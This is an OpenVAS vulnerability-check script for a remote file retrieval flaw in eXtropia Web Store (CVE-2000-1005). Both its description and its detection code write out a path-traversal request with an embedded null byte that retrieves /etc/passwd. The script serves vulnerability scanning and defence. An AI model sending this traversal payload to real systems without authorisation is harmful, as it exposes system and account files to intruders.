# OpenVAS Vulnerability Test
# $Id: http_webstore.nasl 17 2013-10-27 14:01:43Z jan $
# Description: eXtropia Web Store remote file retrieval
#
# Authors:
# Thomas Reinke <reinke@e-softinc.com>
#
# Copyright:
# Copyright (C) 2000 Thomas Reinke
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "eXtropia's Web Store shopping cart
program allows the remote file retrieval of any file
that ends in a .html extension. Further, by supplying
a URL with an imbedded null byte, the script can be made
to retrieve any file at all.

Example:
    GET /cgi-bin/Web_Store/web_store.cgi?page=../../../../etc/passwd%00.html

will return /etc/passwd.";

tag_solution = "None available at this time";

if(description)
{
 script_id(10532);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1774);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2000-1005");
 
 
 name = "eXtropia Web Store remote file retrieval";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "eXtropia Web Store remote file retrieval";
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
 family = "Remote file access";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 buf = string(dir, "/Web_Store/web_store.cgi?page=../../../../../../etc/passwd%00.html");
 buf = http_get(item:buf, port:port);
 rep = http_keepalive_send_recv(port:port, data:buf);
 if( rep == NULL ) exit(0);
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
       security_warning(port);
}

